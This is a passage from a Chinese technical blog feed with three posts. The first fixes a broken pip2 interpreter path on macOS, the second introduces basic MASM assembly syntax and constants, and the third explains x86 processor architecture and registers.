    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>​        这段时间想要使用python2.7版本的pip安装python库，但之前Mac系统自带的python2版本被修改过，导致现在pip2在运行的时候没法准确定位到新安装的python2上面，排查了一下问题，做个记录。</p><h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>​        使用pip2或pip2.7命令报错</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">%</span><span class="bash"> pip2 -V</span><br><br>报错<br>zsh: /usr/local/bin/pip2: bad interpreter: /System/Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python: no such file or directory<br></code></pre></td></tr></table></figure><h1 id="排查"><a href="#排查" class="headerlink" title="排查"></a>排查</h1><p>错误提示没有Python目录</p><p>先看一下现在python2的位置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">%</span><span class="bash"> <span class="hljs-built_in">which</span> python2</span><br>/usr/local/bin/python2<br></code></pre></td></tr></table></figure><p>看到我的python2执行程序确实不在问题提示的目录里面</p><p>去看一下pip2里面的内容，路径是上面报错提示的<code>zsh: /usr/local/bin/pip2</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">%</span><span class="bash"> cat /usr/<span class="hljs-built_in">local</span>/bin/pip2</span><br><span class="hljs-meta">#</span><span class="bash">!/System/Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python</span><br><br><span class="hljs-meta">#</span><span class="bash"> -*- coding: utf-8 -*-</span><br>import re<br>import sys<br><br>from pip._internal.cli.main import main<br><br>if __name__ == &#x27;__main__&#x27;:<br>    sys.argv[0] = re.sub(r&#x27;(-script\.pyw?|\.exe)?$&#x27;, &#x27;&#x27;, sys.argv[0])<br>    sys.exit(main())<br></code></pre></td></tr></table></figure><p>脚本的第一行记录的位置<code>#!/System/Library/Frameworks/Python.framework/Versions/2.7/Resources/Python.app/Contents/MacOS/Python</code>执行程序位置不是我现在的python2执行程序的位置，把这一句改成我现在执行程序的位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin/python2</span><br><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">from</span> pip._internal.cli.main <span class="hljs-keyword">import</span> main<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    sys.argv[<span class="hljs-number">0</span>] = re.sub(<span class="hljs-string">r&#x27;(-script\.pyw?|\.exe)?$&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, sys.argv[<span class="hljs-number">0</span>])<br>    sys.exit(main())<br></code></pre></td></tr></table></figure><p>这边因为我是用的不是root权限，所以我是直接使用访达的 前往-&gt;前往文件夹 功能（快捷键：shift+command+G），输入<code>/usr/local/bin/</code></p><p><img src="./MacOS-%E9%87%8D%E8%A3%85Python2%E5%AF%BC%E8%87%B4pip2%E6%B7%B7%E4%B9%B1/1.jpg" alt="image-20220422092436485"></p><p>进去后看到pip2是一个unix可执行程序，但pip2.7不是，求方便，我就改了pip2.7的python2指向</p><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">%</span><span class="bash"> pip2.7 -V</span><br>pip 20.2.4 from /Library/Frameworks/Python.framework/Versions/2.7/lib/python2.7/site-packages/pip-20.2.4-py2.7.egg/pip (python 2.7)<br></code></pre></td></tr></table></figure><p>成功让pip2.7指向我当前的python2目录</p>]]></content>
    
    
    <categories>
      
      <category>其他学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言基础指令</title>
    <link href="/2022/01/13/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/"/>
    <url>/2022/01/13/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80%E6%8C%87%E4%BB%A4/</url>
    
    <content type="html"><![CDATA[<h1 id="一、第一个汇编语言程序"><a href="#一、第一个汇编语言程序" class="headerlink" title="一、第一个汇编语言程序"></a>一、第一个汇编语言程序</h1><p>程序执行两个数相加，并将结果保存在寄存器中。程序名称为AddTwo：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">main PROC<br>mov eax,5;将数字5送入eax寄存器<br>add eax,6;eax寄存器加6<br><br>INVOKE ExitProcess,0;程序结束<br>main ENDP<br></code></pre></td></tr></table></figure><p>现在按照一次一行代码的方法来仔细查看这段程序：</p><ul><li>  第1行开始main程序（主程序），即程序的入口；</li><li>  第2行将数字5送入eax寄存器；</li><li>  第3行把6加到eax的值上，得到新值11；</li><li>  第5行调用Windows服务（也被称为函数）ExitProcess停止程序，并将控制权交还给操作系统；</li><li>  第6行是主程序结束的标记。</li></ul><p>大家可能已经注意到了程序中包含的注释，它总是用分号开头。程序的顶部省略了一些声明。稍后会予以说明，不过从本质上说，这是一个可以用的程序。</p><p>它不会将全部信息显示在屏幕上，但是借助工具程序调试器的运行，程序员可以按一次一行代码的方式执行程序，并查看寄存器的值。</p><h5 id="添加一个变量"><a href="#添加一个变量" class="headerlink" title="添加一个变量"></a>添加一个变量</h5><p>现在让这个程序变得有趣些，将加法运算的结果保存在变量sum中。要实现这一点，需要增加一些标记，或声明，用来标识程序的代码和数据区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.data;数据区<br>sum DWORD 0;定义名为sum的变量<br><br>.code;代码区<br>main PROC<br>mov eax,5;将数字5送入eax寄存器<br>add eax,6;eax寄存器加6<br>mox sum,eax<br><br>INVOKE ExitProcess,0;程序结束<br>main ENDP<br></code></pre></td></tr></table></figure><p>变量sum在第2行进行了声明，其大小为32位，使用了关键字DWORD。汇编语言中有很多这样的大小关键字次，其作用或多或少与数据类型一样。</p><p>但是与程序员可能熟悉的类型相比它们没有那么 具体，比如int、double、float等等。这些关键字只限制大小，并不检查变量中存放的内容。程序员拥有完全控制权。</p><p>那些被.code和.data伪指令标记的代码和数据区，被称为段。即程序有代码段和数据段。</p><h1 id="二、汇编语言常量"><a href="#二、汇编语言常量" class="headerlink" title="二、汇编语言常量"></a>二、汇编语言常量</h1><p>常量（constant）是程序中使用的一个确定数值，在汇编阶段就可以确定，直接编码与指令代码中，不是保存在存储器中可变的变量，因为是编码在指令中的量，和指令一起存储了，所以不用单独开辟主存空间，所以也就没法动态改变它了，这也是高级语言常量无法修改的原因。</p><h3 id="整数常量"><a href="#整数常量" class="headerlink" title="整数常量"></a>整数常量</h3><p>整数常量（integer literal）（又称为整数常量（integer constant））由一个可选前置符号、一个或多个数字，以及一个指明其基数的可选基数字符构成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[&#123;+|-&#125;] digits [radix]<br></code></pre></td></tr></table></figure><p>由此，比如26就是一个有效的整数常量。它没有基数，所以假设其是十进制形式。如果想要表示十六进制数26，就将其写为26h。同样，数字1101可以被看做是十进制值，除非在其末尾添加“b”，使其成为1101b（二进制）。下表列出了可能的基数数值：</p><table><thead><tr><th>h</th><th>十六进制</th><th>r</th><th>编码实数</th></tr></thead><tbody><tr><td>q/o</td><td>八进制</td><td>t</td><td>十进制（备用）</td></tr><tr><td>d</td><td>十进制</td><td>y</td><td>二进制（备用）</td></tr><tr><td>b</td><td>二进制</td><td></td><td></td></tr></tbody></table><p>下面这些整数常量声明了各种基数。每行都有注释：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">26;十进制<br>26d;十进制<br>11010011b;二进制<br>42q;八进制<br>1Ah;十六进制<br>0A3h;十六进制<br></code></pre></td></tr></table></figure><p>以字母开头的十六进制数必须加个前置0，以防编译器将其解释为标识符。</p><h3 id="整型常量表达式"><a href="#整型常量表达式" class="headerlink" title="整型常量表达式"></a>整型常量表达式</h3><p>整型常量表达式（constant integer expression）是一种算术表达式，它包含了整数常量的算术运算符每个表达式的计算必须是一个整数，并可用32位（从0到FFFFFFFFh）来存放。</p><p>下表列出了算术运算符，并按照从高(1)到低(4)的顺序给出了它们的优先级。对整型常量表达式而言很重要的是，要意识到它们只在汇编时计算。这里将它们简称为整数表达式。</p><table><thead><tr><th>运算符</th><th>名称</th><th>优先级</th></tr></thead><tbody><tr><td>()</td><td>圆括号</td><td>1</td></tr><tr><td>+,-</td><td>一元加、减</td><td>2</td></tr><tr><td>*, /</td><td>乘、除</td><td>3</td></tr><tr><td>MOD</td><td>取模</td><td>3</td></tr><tr><td>+, -</td><td>加、减</td><td>4</td></tr></tbody></table><p>运算符优先级（operator precedence）是指，当一个表达式包含两个或多个运算符时，这些操作的执行顺序。下面是一些表达式和它们的执行顺序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">4+5*2;乘法，加法<br>12-1 MOD 5;取模，减法<br>-5+2;一元减法，加法<br>(4+2)*6;加法，乘法<br></code></pre></td></tr></table></figure><p>下面给出了一些有效表达式和它们的值：</p><table><thead><tr><th>表达式</th><th>值</th></tr></thead><tbody><tr><td>16/5</td><td>3</td></tr><tr><td>-(3+4) * (6-1 )</td><td>-35</td></tr><tr><td>-3+4*6- 1</td><td>20</td></tr><tr><td>25 mod 3</td><td>1</td></tr></tbody></table><h3 id="实数常量"><a href="#实数常量" class="headerlink" title="实数常量"></a>实数常量</h3><p>实数常量（real number literal）（又称为浮点数常量（float-point literal））用于表示十进制实数和编码（十六进制）实数。十进制实数包含一个可选符号，其后跟随一个整数，一个十进制小数点，一个可选的表示小数部分的整数，和一个可选的指数：</p>]]></content>
    
    
    <categories>
      
      <category>二进制基础</category>
      
    </categories>
    
    
    <tags>
      
      <tag>binary</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>x86处理器架构</title>
    <link href="/2022/01/04/x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/"/>
    <url>/2022/01/04/x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<h1 id="一、CPU处理器架构和工作原理"><a href="#一、CPU处理器架构和工作原理" class="headerlink" title="一、CPU处理器架构和工作原理"></a>一、CPU处理器架构和工作原理</h1><h3 id="假想机的基本设计"><a href="#假想机的基本设计" class="headerlink" title="假想机的基本设计"></a>假想机的基本设计</h3><p>中央处理器（CPU）是进行算术和逻辑操作的部件，包含有限数量的存储位置——寄存器（register），一个高频时钟、一个控制单元和一个算术逻辑单元。</p><p><img src="./x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/4-1Z42G10244344.png" alt="微计算机框图"></p><p>其中：</p><ul><li>时钟（clock）对CPU内部操作与系统其他组件进行同步。</li><li>控制单元（control unit，CU）协调参与机器指令执行的步骤序列。</li><li>算术逻辑单元（arithmetic logic unit，ALU）执行算术运算，如加法和减法，以及逻辑运算，如AND（与）、OR（或）和NOT（非）。</li></ul><p>CPU通过主板上CPU插座的引脚与计算机其他部分相连。大部分引脚连接的是数据总线、控制总线和地址总线。</p><p>内存存储单元（memory storage unit）用于在远程运行时保存指令与数据。它接受来自CPU的数据请求，将数据从随机存储器（RAM）传输到CPU，并从CPU传输到内存。</p><p>由于所有的数据处理都在CPU内进行，因此保存在内存中的程序在执行前需要被复制到CPU中。程序指令在复制到CPU时，可以一次复制一条，也可以一次复制多条。</p><p>总线（bus）是一组并行线，用于将数据从计算机一个部分传送到另一个部分。一个计算机系统通常包含四类总线：数据类、I/O类、控制类和地址类。</p><p>数据总线（data bus）在CPU和内存之间传输指令和数据。I/O总线在CPU和系统输入/输出设备之间传输数据。控制总线（control bus）用二进制信号对所有连接在系统总线上设备的行为进行同步。当前执行指令在CPU和内存之间传输数据时，地址总线（address bus）用于保存指令和数据的地址。</p><p>时钟与CPU和系统总线相关的每一个操作都是由一个恒定速率的内部时钟脉冲来进行同步。机器指令的基本时间单位是机器周期（machine cycle）或 时钟周期（clock cycle）。</p><p>一个时钟周期的时长是一个完整时钟脉冲所需要的时间。下图中，一个时钟周期被描绘为两个相邻下降沿之间的时间：</p><p><img src="./x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/4-1Z42G10400A9.png" alt="一个时钟周期"></p><p>时钟周期持续时间用时钟速度的倒数来计算，而时钟速度则用每秒振荡数来衡量。例如，一个每秒振荡10亿次（1GHz）的时钟，其时钟周期为10 亿分之1秒（1纳秒）。</p><p>执行一条机器指令最少需要一个时钟周期，有几个需要的时钟则超过了50个（比如8088处理器中的乘法指令）。由于在CPU、系统总线和内存电路之间存在速度差异，因此，需要访问内存的指令常常需要空时钟周期，也被称为等待状态（wait states）。</p><h3 id="指令执行周期"><a href="#指令执行周期" class="headerlink" title="指令执行周期"></a>指令执行周期</h3><p>一条机器指令不会神奇地一下执行完成。CPU在执行一条机器指令时，需要经过一系列预先定义好的步骤，这些步骤被称为指令执行周期（instruction execution cycle）。</p><p>假设现在指令指针寄存器中已经有了想要执行指令的地址，下面就是执行步骤：</p><ol><li>CPU从被称为指令队列（instruction queue）的内存区域取得指令，之后立即增加指令指针的值。</li><li>CPU对指令的二进制位模式进行译码。这种位模式可能会表示该指令有操作数（输入值）。</li><li>如果有操作数，CPU就会从寄存器和内存中取得操作数。有时，这步还包括了地址计算。</li><li>使用步骤3得到的操作数，CPU执行该指令。同时更新部分状态标志位，如零标志（Zero）、进位标志（Carry）和溢出标志（Overflow）。</li><li>如果输出操作数也是该指令的一部分，则CPU还需要存放其执行结果。</li></ol><p>通常将上述听起来很复杂的过程简化为三个步骤：取指（Fetch）、译码（Decode）和执行（Execute）。操作数（operand）是指操作过程中输入或输出的值。例如、表达式Z=X+Y有两个输入操作数（X和Y），一个输出操作数（Z）。</p><p>下图是一个典型CPU中的数据流框图。该图表现了在指令执行周期中相互交互部件之间的关系。在从内部读取程序指令之前，将其地址放到地址总线上。然后，内存控制器将所需代码送到数据总线上，存入代码高速缓存（code cache）。指令指针的值决定下一条将要执行的指令。指令有指令译码器分析，并产生相应的数值信号送到控制单元，其协调ALU和浮点单元。虽然图中没有画出控制总线，但是其上传输的信号用系统时钟协调不同CPU部件之间的数据传输。</p><p><img src="./x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/4-1Z42G105154O.png" alt="简化的CPU框图"></p><h3 id="读取内存"><a href="#读取内存" class="headerlink" title="读取内存"></a>读取内存</h3><p>作为一个常见现象，计算机从内存读取数据比从内存寄存器读取数据要慢的多。这是因为从内存读取一个值，需要经过下述步骤：</p><ul><li>将想要读取的值的地址放到地址总线上。</li><li>设置处理器RD（读取）引脚（改变RD的值）。</li><li>等待一个时钟周期给存储芯片进行响应 。</li><li>将数据从数据总线复制到目标操作数。</li></ul><p>上述每一步常常只需要一个时钟周期，时钟周期是基于处理器内固定速率时钟节拍的一种时间测量方法。计算机的CPU通常是用其时钟速率来描述。例如，速率为1.2GHz意味着时钟节拍或振荡为每秒12亿次。</p><p>因此，考虑到每个时钟周期仅为1/1200000000秒，4个时钟周期也是非常快的。但是，与CPU寄存器相比，这个速度还是慢了，因为访问寄存器一般只需要1个时钟周期。</p><p>幸运的是，CPU设计者很早之前就已经指出，因为绝大多数程序都需要访问变量，计算机内存成为了速度瓶颈。他们想出了一个聪明的方法来减少读写内存的时间——将大部分近期使用过的指令和数据存放在高速存储器cache中。</p><p>其思想是，程序更可能希望反复访问相同的内存和指令，因此，cache保存这些值就能使它们能被快速访问到。此外，当CPU开始执行一个程序时，它会预先将后续（比如）一千条指令加载到cache中，这个行为是基于这样一种假设，即这些指令很快就会被用到。</p><p>如果这种情况重复发生在一个代码块中，则cache中就会有相同的指令。当处理器能够在cache存储器中发现想要的数据，则称为cache命中（cache hit）。反之，如果cpu在cache中没有找到数据，则称为cache未命中（cache miss）。</p><p>x86系列中的cache存储器有两类型：一级cache（或主cache）位于CPU上；二级cache（或次cache）速度lve慢，通过高速数据总线与CPU相连。这两种cache以最佳方式一起工作。</p><p>还有一个原因使得cache存储器比传统RAM速度快，cache存储器是由一种被称为静态RAM（static RAM）的特殊存储器芯片构成的。这种芯片比较贵，但是不需要为了保持其内容进行不断地刷新。另一方面，传统存储器，即动态RAM（dynamic RAM），就需要持续刷新。它速度慢一些，但是价格更便宜。</p><h3 id="加载并执行程序"><a href="#加载并执行程序" class="headerlink" title="加载并执行程序"></a>加载并执行程序</h3><p>在程序执行之前，需要用一种工具程序将其加载到内存，这种工具程序称为程序加载器（program loader）。加载后，操作系统必须将CPU向程序的入口，即程序开始执行的地址。以下步骤是对这一过程的详细分解。</p><ol><li>操作系统（OS）在当前磁盘目录下搜索程序的文件名。如果找不到，则在预定目录列表（称为路径（path））下搜索文件名。当OS无法检索到文件名时，它会发出一个错误信息。</li><li>如果程序文件被找到，OS就访问磁盘目录中的程序文件基本信息，包括文件大小，及其在磁盘驱动器上的物理位置。</li><li>OS确定内存中下一个可使用的位置，将程序文件加载到内存。为该程序分配内存块，并将程序大小和位置信息加入表中（有时称为描述符表（descriptor table））。另外，OS可能调整程序内指针的值，使得它们包括程序数据地址。</li><li>OS开始执行程序的第一条机器指令（程序入口）。当程序开始执行后，就成为一个进程（progress）。OS为这个进程分配一个标识号（进程ID），用于在执行期间对其进行追踪。</li><li>进程自动运行。OS的工作是追踪进程的执行，并响应系统资源的请求。这些资源包括内存、磁盘文件和输入输出设备等。</li><li>进程结束后，就会从内存中移除。</li></ol><p>不论使用哪个版本的Microsoft Windows，按下Ctrl-Alt-Delete组合键，可以选择任务管理器（task manager）选项，在任务管理器窗口可以查看应用程序和进程列表。</p><p>应用程序列表中列出了当前正在运行的完整程序名称，比如，Windows浏览器，或者Microsoft Visual C++。如果选择进程列表，则会看见一长串进程名。其中的每个进程都是一个独立于其他进程的，并处于运行中的小程序。</p><p>可以连续追踪每个进程使用的CPU时间和内存容量。在某些情况下，选定一个进程名称后，按下Delete键就可以关闭该进程。</p><h1 id="二、32位x86处理器架构"><a href="#二、32位x86处理器架构" class="headerlink" title="二、32位x86处理器架构"></a>二、32位x86处理器架构</h1><h3 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h3><p>x86处理器有三个主要的操作模式：保护模式、实地址模式和系统管理模式；以及一个子模式：虚拟8086（virtual-8086）模式，这是保护模式的特殊情况。以下是对这些模式的简介：</p><ol><li><h5 id="保护模式（Protected-Mode）"><a href="#保护模式（Protected-Mode）" class="headerlink" title="保护模式（Protected Mode）"></a>保护模式（Protected Mode）</h5><p>保护模式是处理器的原生状态，在这种模式下，所有的指令和特性都是可用的。分配给程序的独立区域被称为段，而处理器会阻止程序使用自身范围之外的内存。</p></li><li><p>虚拟8086模式（Virtual-8086 Mode）</p><p>保护模式下，处理器可以在一个安全环境中，直接执行实地址模式软件，如MS-DOS程序。换句话说，如果一个程序崩溃了或是试图向系统内存区域写数据，都不会影响到同一时间内执行的其他程序。现代操作系统可以同时执行多个独立的虚拟8086会话。</p></li><li><p>实地址模式（Real-Address Mode）</p><p>实地址模式实现的是早期Intel处理器的编程环境，但是增加了一些其他特性，如切换到其他模式的功能。当程序需要直接访问系统内存和硬件设备时，这种模式就很有用。</p></li><li><p>系统管理模式（System Management Mode）</p><p>系统管理模式（SMM）向操作系统提供了实现诸如电源管理和系统安全等功能的机制。这些功能通常是由计算机制造商实现的，他们为了一个特定的系统设置而定制处理器。</p></li></ol><h3 id="基本执行环境"><a href="#基本执行环境" class="headerlink" title="基本执行环境"></a>基本执行环境</h3><ol><li><h5 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h5><p>在32位保护模式下，一个任务或程序最大可以寻址4GB的线性地址空间。从P6处理器开始，一种被称为物理寻址（extended physical addressing）的技术使得可以被寻址的物理内存空间增加到64GB。</p><p>与之相反，实地址模式程序只能寻址1MB空间。如果处理器在保护模式下运行多个虚拟8086程序，则每个程序只能拥有自己的1MB内存空间。</p></li><li><h5 id="基本程序执行寄存器"><a href="#基本程序执行寄存器" class="headerlink" title="基本程序执行寄存器"></a>基本程序执行寄存器</h5><p>寄存器是直接位于CPU内到高速存储位置，其设计访问速度远高于传统存储器。例如，当一个循环处理为了速度进行优化时，其循环计数会保留在寄存器中而不是变量中。</p><p>下图展示的是基本程序执行寄存器（basic program execution registers）。8个通用寄存器，6个段寄存器，一个处理状态标志寄存器（EFLAGS），和一个指令指针寄存器（EIP）。</p><p><img src="./x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/4-1Z42G35644562.png" alt="基本程序执行寄存器"></p><h5 id="通用寄存器"><a href="#通用寄存器" class="headerlink" title="通用寄存器"></a>通用寄存器</h5><p>通用寄存器主要用于算术运算和数据传输。如下图所示，EAX寄存器的低16位在使用时可以用AX表示。</p><p><img src="./x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/4-1Z42G35P0916.png" alt="通用寄存器"></p><p>一些寄存器的组成部分可以处理8位的值。例如，AX寄存器的高8位被称为AH，而低8位被称为AL。同样的重叠关系也存在于EAX、EBX、ECX和EDX寄存器中：</p><table><thead><tr><th>32 位</th><th>16 位</th><th>8 位（高）</th><th>8 位（低）</th></tr></thead><tbody><tr><td>EAX</td><td>AX</td><td>AH</td><td>AL</td></tr><tr><td>EBX</td><td>BX</td><td>BH</td><td>BL</td></tr><tr><td>ECX</td><td>CX</td><td>CH</td><td>CL</td></tr><tr><td>EDX</td><td>DX</td><td>DH</td><td>DL</td></tr></tbody></table><p>其他通用寄存器只能用32位或16位名称来访问，如下表所示：</p><table><thead><tr><th>32 位</th><th>16 位</th><th>32 位</th><th>16 位</th></tr></thead><tbody><tr><td>ESI</td><td>SI</td><td>EBP</td><td>BP</td></tr><tr><td>EDI</td><td>DI</td><td>ESP</td><td>SP</td></tr></tbody></table><h5 id="特殊用法"><a href="#特殊用法" class="headerlink" title="特殊用法"></a>特殊用法</h5><p>某些通用寄存器有特殊用法：</p><ul><li>乘除指令默认使用EAX。它常常被称为扩展累加器（extended accumulator）寄存器。</li><li>CPU默认使用ECX为循环计数器。</li><li>ESP用于寻址堆栈（一种系统内存结构）数据。它极少用于一般算术运算和数据传输，通常被称为扩展堆栈指针（extended stack pointer）寄存器。</li><li>ESI和EDI用于高速存储器传输指令，有时也被称为扩展源变址（extended source index）寄存器和扩展目的变址（extended destination index）寄存器。</li><li>高级语言通过EBP来引用堆栈中的函数参数和局部变量。除了高级编程，它不用于一般算术运算和数据传输。它常常被称为扩展帧指针（extended frame pointer）寄存器。</li></ul><h5 id="段寄存器"><a href="#段寄存器" class="headerlink" title="段寄存器"></a>段寄存器</h5><p>实地址模式中，16位段寄存器表示的是预先分配的内存区域的基址，这个内存区域称为段。保护模式中，段寄存器中存放的是段描述符表指针。一些段中存放程序指令（代码），其他段存放变量（数据），还有一个堆栈段存放的是局部函数变量和函数参数。</p><h5 id="指令指针"><a href="#指令指针" class="headerlink" title="指令指针"></a>指令指针</h5><p>指令指针（EIP）寄存器中包含下一条将要执行指令的地址。某些机器指令能控制EIP，使得程序分支转向到一个新位置。</p><h5 id="EFLAGS寄存器"><a href="#EFLAGS寄存器" class="headerlink" title="EFLAGS寄存器"></a>EFLAGS寄存器</h5><p>EFLAGS（或Flags）寄存器包含了独立的二进制位，用于控制CPU的操作，或是反映一些CPU操作的结果。有些指令可以测试和控制这些单独的处理器标志位。</p><p>设置标志位时，该标识位=1；清楚（或重置）标识位时，该标识位=0。</p><h5 id="控制标识位"><a href="#控制标识位" class="headerlink" title="控制标识位"></a>控制标识位</h5><p>控制标志位控制CPU的操作。例如，它们能使得CPU每执行一条指令后进入中断；在侦测到算术运算溢出时中断执行；进入虚拟8086模式，以及进入保护模式。</p><p>程序能够通过设置EFLAGS寄存器中的单独位来控制CPU的操作，比如，方向标志位和中断标志位。</p><h5 id="状态标志位"><a href="#状态标志位" class="headerlink" title="状态标志位"></a>状态标志位</h5><p>状态标志位反映了CPU执行的算术和逻辑操作的结果。其中包括：溢出位、符号位、零标志位、辅助进位标志位、奇偶校验位和进位标志位。下述说明中，标志位的缩写紧跟在标志位名称之后：</p><ul><li>进位标志位（CF），与目标位置相比，无符号算术运算结果太大时，设置该标志位。</li><li>溢出标志位（OF），与目标位置相比，有符号算术运算结果太大或太小时，设置该标志位。</li><li>符号标志位（SF），算术或逻辑操作产生负结果时，设置该标志位。</li><li>零标志位（ZF），算术或逻辑操作产生结果为零时，设置该标志位。</li><li>辅助进位标志符（AC），算术操作在8位操作数中产生了位3向位4的进位时，设置该标志位。</li><li>奇偶校验标志位（PF），结果的最低有效字节包含偶数个1 时，设置该标志位，否则，清除该标志位。一般情况下，如果数据有可能被修改或损坏时，该标志位用于进行错误检测。</li></ul></li><li><h5 id="MMX寄存器"><a href="#MMX寄存器" class="headerlink" title="MMX寄存器"></a>MMX寄存器</h5><p>在实现高级多媒体和通信应用时，MMX技术提高了Intel处理器的性能。8个64位MMX寄存器支持称为SMD（单指令，多数据，Single- Instruction，Multiple-Data）的特殊指令。</p><p>顾名思义，MMX指令对MMX寄存器中的数据值进行并行操作。虽然，它们看上去是独立的寄存器，但是MMX寄存器名实际上是浮点单元中使用的同样寄存器的别名。</p></li><li><h5 id="XMM寄存器"><a href="#XMM寄存器" class="headerlink" title="XMM寄存器"></a>XMM寄存器</h5><p>x86结构还包括8个128位XMM寄存器，它们被用于SIMD流扩展指令集。</p><h5 id="浮点单元"><a href="#浮点单元" class="headerlink" title="浮点单元"></a>浮点单元</h5><p>浮点单元（FPU，floating-point unit）执行高速浮点运算。之前为了这个目的，需要一个独立的协处理器芯片。从Intel486处理器开始，FPU已经集成到主处理器芯片上。</p><p>FPU中有8个浮点数据寄存器，分别命名为ST（0），ST（1），ST（2），ST（3），ST（4），ST（5），ST（6）和ST（7）。其他控制寄存器和指针寄存器如下图所示。</p><p><img src="./x86%E5%A4%84%E7%90%86%E5%99%A8%E6%9E%B6%E6%9E%84/4-1Z42G4034NE.png" alt="浮点单元寄存器"></p></li><li><h5 id="X86内存管理"><a href="#X86内存管理" class="headerlink" title="X86内存管理"></a>X86内存管理</h5><p>x86处理器按照前面讨论的基本操作模式来管理内存。保护模式是最可靠、最强大的，但是它对应用程序直接访问系统硬件有着严格的限制。</p><p>在实地址模式中，只能寻址1MB内存，地址从00000H到FFFFFH。处理器一次只能运行一个程序，但是可以暂时中断程序来处理来自外围设备的请求（称为中断（interrupt））。</p><p>应用程序被允许访问内存的任何位置，包括那些直接与系统设备相关的地址。MS-DOS操作系统在实地址模式下运行，Windows 95和98能够引导进入这种模式。</p><p>在保护模式中，处理器可以同时运行多个程序，它为每个进程（运行中的程序）分配总共4GB的内存。每个程序都分配有自己的保留内存区域，程序之间禁止意外访问其他程序的代码和数据。MS-Windows和Linux运行在保护模式下。</p><p>在虚拟8086模式中，计算机运行在保护模式下，通过创建一个带有1MB地址空间的虚拟8086机器来模拟运行于实地址模式的80x86计算机。例如，在Windows NT和2000下，当打开一个命令窗口时，就创建了一个虚拟8086机器。在同一时间可以运行多个这样的窗口，并且窗口之间都是受到保护的。</p><p>在Window NT，2000和XP系统中，某些需要直接使用计算机硬件的MS-DOS程序不能运行在虚拟8086模式下。</p></li></ol><h1 id="三、64位x86-64处理器架构"><a href="#三、64位x86-64处理器架构" class="headerlink" title="三、64位x86-64处理器架构"></a>三、64位x86-64处理器架构</h1><p>Intel64和AMD64处理器系列的基本特征：</p><ol><li>向后兼容x86指令集。</li><li>地址长度为64位通用寄存器，允许指令具有64位整数操作数。</li><li>可以使用64位通用寄存器，允许指令具有64位整数操作数。</li><li>比x86多了8个通用寄存器。</li><li>物理地址为48位，支持高达256TB的RAM。</li></ol><p>另一方面，当处理器运行于本机64位模式时，是不支持16位实模式或虚拟8086模式的。（在传统模式（legacy mode）下，还是支持16位编程，但是在Microsolft 